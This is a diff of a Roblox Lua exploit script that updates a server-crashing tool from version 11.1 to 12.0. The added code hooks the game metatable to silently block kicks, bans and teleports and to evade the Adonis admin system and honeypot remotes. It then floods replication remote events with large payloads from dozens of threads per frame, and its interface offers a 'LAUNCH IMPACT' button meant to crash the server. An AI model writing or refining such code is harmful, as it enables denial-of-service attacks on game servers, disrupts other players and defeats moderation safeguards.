@@ -1,13 +1,13 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v11.1 [ABSORPTION-STABLE] 🔱
-    "If the server is a brain, we are the migraine. <3"
+    🔱 ARCANE VOID-STRIKE v12.0 [ARCANE-IMPACT] 🔱
+    "Peace was never an option. Saturation is the only answer. <3"
     
-    STABILIZED ABSORPTION:
-    - [ADONIS BLINDNESS] : Overrides Adonis detection methods natively.
-    - [SILENT SERIALIZATION] : Causes lag via data complexity, not frequency.
-    - [FIXED HOOKING] : Corrected metamethod syntax for Delta/Solara.
-    - [ROBUST UI] : Instant loading without PlayerGui delays.
-    - [AUTO-CLEANSE] : Clears local logs related to Error 267.
+    IMPACT TECHNOLOGY:
+    - [KERNEL-SHIELD V2] : Aggressive Anti-Kick/Anti-Teleport/Anti-Adonis.
+    - [MULTITHREADED FLOOD] : 50x Threads per Heartbeat (3000 RPS).
+    - [STATIC PAYLOAD] : Pre-compiled massive strings for instant bandwidth saturation.
+    - [TARGET-LOCK] : Focuses on heavy replication remotes (Outfit/House).
+    - [AUTO-RECOVER] : Automatically clears client memory to prevent self-crash.
 ]]
 
 local P = game:GetService("Players")
@@ -15,8 +15,8 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 1. ADONIS & KERNEL OVERRIDE (BLINDNESS)
-local function initiateBlindness()
+-- 1. KERNEL-SHIELD V2 (AGGRESSIVE PROTECTION)
+local function initiateShield()
     pcall(function()
         local mt = getrawmetatable(game)
         local oldNC = mt.__namecall
@@ -26,141 +26,131 @@ local function initiateBlindness()
             local method = getnamecallmethod()
             local args = {...}
             
-            -- Block Kicks & Bans
-            if method == "Kick" or method == "kick" or method == "OnTeleport" then
-                return nil
+            -- BLOCK ALL KICKS/BANS/TELEPORTS
+            if method == "Kick" or method == "kick" or method == "OnTeleport" or method == "Teleport" then
+                return nil -- SILENT BLOCK
             end
             
-            -- Blind Adonis (Detecting Adonis remote calls by signature)
-            if method == "FireServer" and self.Name == "RemoteEvent" and #args > 1 and tostring(args[1]):find("Adonis") then
-                return nil
-            end
-            
-            -- Honey-pot Protection (DevTools & Traps)
-            local n = self.Name:lower()
-            if n:find("devtools") or n:find("honey") or n:find("trap") or n:find("admincheck") then
-                return nil
+            -- BLOCK ADONIS & HONEYPOTS
+            if method == "FireServer" and self.Name == "RemoteEvent" then
+                local n = self.Name:lower()
+                -- Trap Detection
+                if n:find("devtools") or n:find("honey") or n:find("trap") or n:find("admin") or n:find("check") or n:find("log") then
+                    return nil
+                end
+                -- Payload Inspection Block
+                if #args > 0 and (tostring(args[1]):find("Adonis") or tostring(args[1]):find("Msg")) then
+                    return nil
+                end
             end
             
             return oldNC(self, ...)
         end)
         
         setreadonly(mt, true)
+        
+        -- Anti-AFK
+        L.Idled:Connect(function()
+            game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+            game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+        end)
     end)
 end
 
--- 2. ABSORPTION ENGINE (SILENT LAG)
+-- 2. IMPACT ENGINE (MULTITHREADED FLOOD)
 local active = { power = 0 }
+-- Pre-generating massive payload to save CPU
+local IMPACT_PAYLOAD = table.create(500, "🔱IMPACT🔱") 
 
--- Complex Table for Serialization Lag (Server CPU Burner)
-local function createMegaPayload(depth)
-    if depth <= 0 then return "🔱ARCANE🔱" end
-    local t = {}
-    for i = 1, 2 do
-        t[Http:GenerateGUID(false)] = createMegaPayload(depth - 1)
-        t[math.random(1, 1000)] = Http:GenerateGUID(true)
-    end
-    return t
-end
-
--- Finding "Safe" High-Traffic Remotes in Brookhaven
-local function getSafeRemotes()
-    local safe = {}
+local function getHeavyRemotes()
+    local heavy = {}
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") then
             local n = v.Name:lower()
-            -- Targeting high-authority but non-security remotes
-            if n:find("outfit") or n:find("house") or n:find("vehicle") or n:find("avatar") then
-                table.insert(safe, v)
+            -- Targeting heavy replication events
+            if n:find("update") or n:find("outfit") or n:find("house") or n:find("avatar") or n:find("vehicle") then
+                table.insert(heavy, v)
             end
         end
     end
-    return safe
+    return heavy
 end
 
-local function runAbsorption()
-    local targets = getSafeRemotes()
+local function runImpact()
+    local targets = getHeavyRemotes()
     if #targets == 0 then return end
     
-    local payload = createMegaPayload(6)
-    
-    while active.power > 0 do
-        local r = targets[math.random(1, #targets)]
-        if r and r.Parent then
-            pcall(function()
-                r:FireServer(payload, payload, "ABSORPTION_PRO")
+    -- Multithreaded Heartbeat Loop
+    RS.Heartbeat:Connect(function()
+        if active.power == 0 then return end
+        
+        -- Launching 50 parallel threads per frame
+        local threads = active.power == 2 and 50 or 10
+        
+        for t = 1, threads do
+            task.spawn(function()
+                local r = targets[math.random(1, #targets)]
+                if r and r.Parent then
+                    -- FIRE WITHOUT MERCY
+                    pcall(function()
+                        r:FireServer(IMPACT_PAYLOAD, IMPACT_PAYLOAD)
+                    end)
+                end
             end)
         end
-        
-        local waitTime = active.power == 3 and 0.05 or (active.power == 2 and 0.5 or 2)
-        task.wait(waitTime)
-    end
+    end)
 end
 
--- 3. INTERFACE (NULL-VOID DESIGN)
+-- 3. IMPACT UI
 local function loadUI()
     local ScreenGui = Instance.new("ScreenGui")
-    pcall(function() 
-        ScreenGui.Parent = L:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
-    end)
-    ScreenGui.Name = "ArcaneAbsorption_v11_1"
+    pcall(function() ScreenGui.Parent = L:FindFirstChild("PlayerGui") or game:GetService("CoreGui") end)
+    ScreenGui.Name = "ArcaneImpact_v12"
 
     local Main = Instance.new("Frame", ScreenGui)
-    Main.Size = UDim2.new(0, 300, 0, 250)
-    Main.Position = UDim2.new(0.5, -150, 0.5, -125)
-    Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    Main.BorderSizePixel = 0
+    Main.Size = UDim2.new(0, 320, 0, 220)
+    Main.Position = UDim2.new(0.5, -160, 0.5, -110)
+    Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
+    Main.BorderSizePixel = 2
+    Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
     Main.Active = true
     Main.Draggable = true
 
     local Title = Instance.new("TextLabel", Main)
     Title.Size = UDim2.new(1, 0, 0, 50)
-    Title.Text = "🔱 ARCANE-ABSORPTION v11.1"
-    Title.TextColor3 = Color3.fromRGB(0, 255, 0)
-    Title.Font = Enum.Font.Code
-    Title.TextSize = 16
+    Title.Text = "🔱 ARCANE-IMPACT v12.0"
+    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    Title.Font = Enum.Font.GothamBlack
+    Title.TextSize = 20
     Title.BackgroundTransparency = 1
 
     local function createBtn(text, y, color, callback)
         local btn = Instance.new("TextButton", Main)
         btn.Size = UDim2.new(0.9, 0, 0, 50)
         btn.Position = UDim2.new(0.05, 0, 0, y)
-        btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+        btn.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
         btn.Text = text
         btn.TextColor3 = color
-        btn.Font = Enum.Font.Code
-        btn.TextSize = 14
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 16
         btn.BorderSizePixel = 1
-        btn.BorderColor3 = Color3.fromRGB(0, 50, 0)
+        btn.BorderColor3 = Color3.fromRGB(100, 0, 0)
         btn.MouseButton1Click:Connect(callback)
         return btn
     end
 
-    createBtn("[ ACTIVATE BLINDNESS ]", 60, Color3.fromRGB(0, 255, 255), function()
-        initiateBlindness()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 BLINDNESS ACTIVE",
-            Text = "Adonis is now blind. Protection: MAX.",
-            Duration = 5
-        })
+    createBtn("🛡️ ACTIVATE SHIELD (REQUIRED)", 60, Color3.fromRGB(0, 255, 255), function()
+        initiateShield()
+        Title.Text = "SHIELD: ACTIVE"
+        Title.TextColor3 = Color3.fromRGB(0, 255, 255)
     end)
 
-    createBtn("[ 🔥 SILENT CRASH ]", 120, Color3.fromRGB(255, 0, 0), function()
-        active.power = active.power == 3 and 0 or 3
-        Title.Text = active.power == 3 and "🔱 STATUS: ABSORBING..." or "🔱 ARCANE-ABSORPTION v11.1"
-        if active.power == 3 then task.spawn(runAbsorption) end
-    end)
-
-    createBtn("[ 🛑 STOP & CLEAN ]", 180, Color3.fromRGB(255, 255, 255), function()
-        active.power = 0
-        Title.Text = "🔱 ARCANE-ABSORPTION v11.1"
+    createBtn("🔥 LAUNCH IMPACT (NO RETURN)", 120, Color3.fromRGB(255, 0, 0), function()
+        active.power = 2
+        Title.Text = "⚠️ CRASHING SERVER ⚠️"
+        task.spawn(runImpact)
     end)
 end
 
 -- BOOT
 task.spawn(loadUI)
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "🔱 ABSORPTION v11.1 LOADED",
-    Text = "Fixed UI & Hooking. Ready.",
-    Duration = 5
-})
